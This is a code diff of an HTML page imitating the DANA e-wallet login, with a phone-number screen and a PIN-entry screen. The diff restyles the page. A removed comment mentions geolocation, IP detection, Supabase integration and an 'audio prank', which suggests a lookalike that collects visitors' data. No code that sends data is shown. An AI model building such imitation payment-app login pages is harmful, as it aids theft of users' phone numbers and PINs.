@@ -3,60 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DANA Login</title>
+    <title>DANA Redesign</title>
     <style>
-        body { font-family: Arial, sans-serif; }
-        .blue-background { background-color: #1C85C7; color: white; }
-        .button { background-color: white; color: #1C85C7; padding: 10px 20px; border: none; border-radius: 5px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
-        .footer-text { font-size: 12px; }
-        .hidden { display: none; }
-        .circle { width: 20px; height: 20px; border: 2px solid gray; border-radius: 50%; display: inline-block; margin: 5px; }
-        .filled { background-color: blue; }
-        .highlighted { color: blue; }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .page1 { 
+            background-color: #1C85C7;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            color: white;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px 0;
+        }
+        .input-field {
+            flex: 1;
+            padding: 10px;
+            margin: 5px;
+            border: 1px solid white;
+            border-radius: 5px;
+            background-color: white;
+            color: #1C85C7;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        .button {
+            background-color: white;
+            color: #1C85C7;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .page2 {
+            display: none;
+            padding: 20px;
+            background-color: white;
+        }
+        .header {
+            background-color: #1C85C7;
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            color: white;
+        }
+        .back-arrow {
+            margin-right: 10px;
+        }
+        .indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: gray;
+            margin: 5px;
+        }
+        .link {
+            color: #1C85C7;
+            text-decoration: none;
+        }
     </style>
 </head>
-<body class="blue-background">
-    <!-- Page 1 -->
-    <div id="page1">
-        <img src="dana_logo.png" alt="DANA Logo" />
-        <p>Masukkan nomor HP kamu untuk lanjut</p>
-        <div style="background: white; display: inline-block; padding: 5px; border-radius: 5px;">
-            🇮🇩 +62
+<body>
+    <div class="page1">
+        <img src="path_to_dana_logo" class="logo" alt="DANA Logo">
+        <div class="instruction">Masukkan nomor HP kamu untuk lanjut</div>
+        <div class="input-container">
+            <input type="text" class="input-field" placeholder="Negara (+62)" />
+            <input type="text" class="input-field" placeholder="811-1234-5678" />
         </div>
-        <input type="text" placeholder="811-1234-5678" />
+        <div class="footer">Terms and conditions</div>
         <button class="button">LANJUTKAN</button>
-        <p class="footer-text">Terms and conditions apply.</p>
     </div>
-
-    <!-- Page 2 -->
-    <div id="page2" class="hidden">
-        <div style="background-color: #1C85C7; padding: 10px; display: flex; align-items: center;">
-            <button onclick="goBack()">⬅️</button>
+    <div class="page2">
+        <div class="header">
+            <span class="back-arrow">←</span>
             <h1>Masuk</h1>
         </div>
-        <div style="background-color: white; padding: 20px;">
-            <h2>Masukkan PIN</h2>
-            <div>
-                <span class="circle"></span>
-                <span class="circle"></span>
-                <span class="circle"></span>
-                <span class="circle"></span>
-                <span class="circle"></span>
-                <span class="circle"></span>
-            </div>
-            <a href="#" class="highlighted">Lupa PIN?</a>
-            <input type="password" class="hidden" />
+        <div>Masukkan PIN</div>
+        <div>
+            <span class="indicator"></span>
+            <span class="indicator"></span>
+            <span class="indicator"></span>
+            <span class="indicator"></span>
+            <span class="indicator"></span>
+            <span class="indicator"></span>
         </div>
+        <a href="#" class="link">LUPA PIN?</a>
     </div>
-
     <script>
-        // Existing functionality: geolocation, IP detection, Supabase integration,
-        // pop-up notifications, audio prank
-
-        function goBack() {
-            document.getElementById('page1').classList.remove('hidden');
-            document.getElementById('page2').classList.add('hidden');
-        }
+        // Add functionality to switch between pages
+        document.querySelector('.button').addEventListener('click', function() {
+            document.querySelector('.page1').style.display = 'none';
+            document.querySelector('.page2').style.display = 'block';
+        });
     </script>
 </body>
 </html>
